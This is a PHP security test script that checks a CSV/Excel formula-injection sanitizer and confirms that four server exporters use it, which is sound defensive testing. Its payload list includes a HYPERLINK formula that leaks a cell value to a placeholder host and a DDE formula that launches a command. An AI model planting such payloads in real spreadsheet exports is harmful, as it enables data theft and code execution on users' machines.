<?php
// teste-csv-servidor.php (AZUL/ESQUERDA, 27/11) — CSV/Excel Injection no lado SERVIDOR: o helper api/_helpers/CsvSeguro.php e os 4 exportadores
// PHP que gravam texto de pessoas (panel-05 clientes do ERP, panel-01 requisições, usuários, Bling). Uso: php scripts/seguranca/teste-csv-servidor.php [RAIZ]
// Contraprova: rode com RAIZ = uma árvore anterior (ex.: a P133) — tem de reprovar.
declare(strict_types=1);
$raiz = realpath($argv[1] ?? __DIR__ . '/../..');
$n = 0; $f = []; $ok = function (bool $c, string $nome) use (&$n, &$f) { $n++; if (!$c) $f[] = $nome; };
$h = "$raiz/api/_helpers/CsvSeguro.php";
if (!is_file($h)) { $ok(false, 'helper api/_helpers/CsvSeguro.php ausente (versão sem a correção)'); }
else {
    require $h;
    $perigo = ['=1+1', '+1+1', '-1+1', '@SUM(A1:A2)', "\t=1", "\r=1", "\n=1", ' =1', "\u{00a0}=1", "\u{3000}=1", "\u{ff1d}1", "\u{ff0b}1", "\u{ff0d}1", "\u{ff20}x", '=HYPERLINK("http://exemplo.invalid/?d="&A1;"x")', "=cmd|' /C calc'!A0"];
    $ruins = array_values(array_filter($perigo, fn($p) => !str_starts_with((string) CsvSeguro::celula($p), "'")));
    $ok($ruins === [], 'helper: ' . count($perigo) . ' payloads (= + - @, TAB/CR/LF, espaço/NBSP/ideográfico antes, largura total, HYPERLINK, DDE) ganham apóstrofo · falharam ' . json_encode($ruins));
    $ok(CsvSeguro::celula('Cliente Fictício') === 'Cliente Fictício' && CsvSeguro::celula('a=b') === 'a=b' && CsvSeguro::celula('e-mail@exemplo.invalid') === 'e-mail@exemplo.invalid', 'helper: texto comum intacto (= - @ no meio)');
    $ok(CsvSeguro::celula('-123.45') === '-123.45' && CsvSeguro::celula('-10') === '-10' && CsvSeguro::celula('1234,5') === '1234,5' && CsvSeguro::celula(-7) === -7 && CsvSeguro::celula(2.5) === 2.5 && CsvSeguro::celula(null) === '',
        'helper: números (int/float e strings puramente numéricas do PDO, negativos inclusive) intactos; nulo = vazio');
    $lat = ["=1+1\xe9", "@SUM(A1)\xe7", "+cmd\xe3o", "-2+3\xea", "\xa0=1\xe9", "\t=1\xe9"];
    $ruinsL = array_values(array_filter($lat, fn($p) => !str_starts_with((string) CsvSeguro::celula($p), "'")));
    $ok($ruinsL === [] && CsvSeguro::celula("Jos\xe9 da Silva") === "Jos\xe9 da Silva", 'helper: UTF-8 INVÁLIDO (Latin-1 do ERP/Bling) também neutralizado (fallback por bytes); texto Latin-1 comum intacto · falharam ' . json_encode(array_map('bin2hex', $ruinsL)));
    $m = fopen('php://memory', 'w+'); fputcsv($m, CsvSeguro::linha(['=1;2', 'a"b', -5, '-9.5', 'ok']), ';'); rewind($m); $l = trim(stream_get_contents($m));
    $ok($l === "\"'=1;2\";\"a\"\"b\";-5;-9.5;ok", 'linha + fputcsv: neutraliza ANTES do escape do fputcsv; aspas dobradas; números intactos · ' . $l);
}
$arq = ['api/modules/panels/panel-05/api.php', 'api/modules/panels/panel-01/api.php', 'api/admin/users/index.php', 'api/bling/controllers/ExportController.php'];
foreach ($arq as $a) {
    $s = (string) @file_get_contents("$raiz/$a");
    $tot = preg_match_all('/fputcsv\(/', $s); $seg = preg_match_all('/fputcsv\([^,]+, CsvSeguro::linha\(/', $s);
    $ok($tot > 0 && $tot === $seg && str_contains($s, '_helpers/CsvSeguro.php'), "estático: $a — todo fputcsv passa pelo CsvSeguro ($seg de $tot)");
}
if ($f) { echo "[ERRO] teste-csv-servidor: " . count($f) . " de $n\n"; foreach ($f as $x) echo " - $x\n"; exit(1); }
echo "[OK]   teste-csv-servidor: $n verificações (helper PHP com payloads, texto comum e números intactos, neutralização antes do escape do fputcsv, 4 exportadores do servidor)\n";
